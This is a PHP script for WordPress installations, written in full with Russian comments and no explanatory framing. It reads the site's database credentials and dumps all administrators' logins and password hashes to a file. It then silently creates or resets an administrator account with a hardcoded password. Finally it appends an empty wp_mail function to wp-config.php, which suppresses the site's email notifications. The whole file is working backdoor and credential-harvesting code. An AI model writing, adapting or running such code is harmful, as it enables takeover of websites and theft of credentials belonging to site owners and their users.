<?php
/************ CONFIG *************/
/* define('DB_HOST', "localhost");
define('DB_LOGIN', "");
define('DB_PASSWORD', "");
define('DB_NAME', ""); */
/************ CONFIG *************/

include_once 'wp-config.php';

/////////////////////////////////////////////////

ini_set('display_errors', 1);
ini_set('log_errors', 1);
error_reporting(E_ALL);

date_default_timezone_set('UTC');
header('Expires: Sat, 26 Jul 1997 05:00:00 GMT');
header('Last-Modified: ' . gmdate( 'D, d M Y H:i:s' ) . ' GMT');
header('Cache-Control: no-store, no-cache, must-revalidate');
header('Cache-Control: post-check=0, pre-check=0', false);
header('Pragma: no-cache');



$mysqli = new mysqli(DB_HOST, DB_USER, DB_PASSWORD, DB_NAME);

// connection check
if ($mysqli->connect_errno) {
	printf("Error connect: %s\n", $mysqli->connect_error);
	exit();
}
//default config

$user_login = 'admin_user'; // логин админа

$user_pass = 'ZFsaPCns'; // пароль админа


$sql = "SELECT * FROM `".$mysqli->real_escape_string($table_prefix)."users` LEFT JOIN `".$mysqli->real_escape_string($table_prefix)."usermeta` ON `".$mysqli->real_escape_string($table_prefix)."users`.`ID`= `".$mysqli->real_escape_string($table_prefix)."usermeta`.`user_id` WHERE `".$mysqli->real_escape_string($table_prefix)."usermeta`.`meta_key`='".$mysqli->real_escape_string($table_prefix)."capabilities' AND `".$mysqli->real_escape_string($table_prefix)."usermeta`.`meta_value`='a:1:{s:13:\"administrator\";b:1;}'";

$res = $mysqli->query($sql);

$admin_list = [];

$isset_newadmin = 0;

while($r = $res->fetch_assoc())
{
	if($r['user_login'] == $user_login) { $isset_newadmin=1; }
	$admin_list[] = $r['user_login'].' / '.$r['user_pass'];
	
}

file_put_contents(__DIR__.'/wp_admins_list.txt',implode("\r\n", $admin_list));	
	
	
if($isset_newadmin == 1) {
	echo 'Такой пользователь уже существует';

	$sql = "UPDATE `".$mysqli->real_escape_string($table_prefix)."users` SET `user_pass`=MD5('{$user_pass}') WHERE `user_login`='{$user_login}'";
	$res = $mysqli->query($sql);
}
else
{

$newuser_datetime = @date("Y-m-d H:i:s");

$sql = "INSERT INTO `".$mysqli->real_escape_string($table_prefix)."users`
				(`user_login`, `user_pass`, `user_nicename`, `user_email`, `user_registered`, `user_activation_key`, `user_status`, `display_name`)
				VALUES ('{$user_login}', MD5('{$user_pass}'), '{$user_login}', 'test@test.test', '{$newuser_datetime}', '', '0', '{$user_login}')";

$res = $mysqli->query($sql);

$newuser_id = $mysqli->insert_id;

$newuser_security = $mysqli->real_escape_string('a:1:{s:13:"administrator";b:1;}');

$sql = "INSERT INTO `".$mysqli->real_escape_string($table_prefix)."usermeta`
				(`user_id`, `meta_key`, `meta_value`) VALUES ('{$newuser_id}', '".$mysqli->real_escape_string($table_prefix)."capabilities', '{$newuser_security}')";

$res2 = $mysqli->query($sql);

$sql = "INSERT INTO `".$mysqli->real_escape_string($table_prefix)."usermeta`
				(`user_id`, `meta_key`, `meta_value`) VALUES ('{$newuser_id}', '".$mysqli->real_escape_string($table_prefix)."user_level', '10')";

$res3 = $mysqli->query($sql);



$mysqli->query("INSERT INTO `".$mysqli->real_escape_string($table_prefix)."usermeta` (`user_id`, `meta_key`, `meta_value`) VALUES ('{$newuser_id}', 'rich_editing', 'true')");

$mysqli->query("INSERT INTO `".$mysqli->real_escape_string($table_prefix)."usermeta` (`user_id`, `meta_key`, `meta_value`) VALUES ('{$newuser_id}', 'admin_color',  'fresh')");

$mysqli->query("INSERT INTO `".$mysqli->real_escape_string($table_prefix)."usermeta` (`user_id`, `meta_key`, `meta_value`) VALUES ('{$newuser_id}', 'nickname', '{$user_login}')");

$mysqli->query("INSERT INTO `".$mysqli->real_escape_string($table_prefix)."usermeta` (`user_id`, `meta_key`, `meta_value`) VALUES ('{$newuser_id}', 'first_name', '')");

$mysqli->query("INSERT INTO `".$mysqli->real_escape_string($table_prefix)."usermeta` (`user_id`, `meta_key`, `meta_value`) VALUES ('{$newuser_id}', 'last_name', '')");
	
		
echo 'ok';
			
$mysqli->close();

$old_config = file_get_contents(__DIR__.'/wp-config.php');
if($old_config == str_ireplace('function wp_mail() {}','',$old_config)) {
	file_put_contents(__DIR__."/wp-config.php","function wp_mail() {}\r\n", FILE_APPEND);
}
}